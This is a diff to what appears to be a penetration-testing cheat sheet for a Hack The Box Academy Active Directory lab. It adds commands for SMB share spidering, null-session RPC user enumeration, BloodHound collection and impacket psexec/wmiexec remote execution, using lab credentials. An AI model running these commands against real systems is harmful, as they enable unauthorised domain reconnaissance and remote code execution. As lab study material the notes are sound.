@@ -1191,10 +1191,33 @@ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ## crackmapexec - Domain Group Enumeration
 sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
 
-## crackmapexec - CME - Logged On Users
+## crackmapexec - CME - Logged On Users and shares
 sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+head -n 10 /tmp/cme_spider_plus/172.16.5.5.json
 
+## Using sql map
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 
+## Using rpcclient
+rpcclient -U "" -N 172.16.5.5
+queryuser 0x457
+enumdomusers
+
+## impacket 
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+
+## Windapsearch
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
+## Bloodhound.py
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+https://academy.hackthebox.com/course/preview/active-directory-bloodhound
+https://wadcoms.github.io/
 ```
 ##### Living Of The Land
 ```
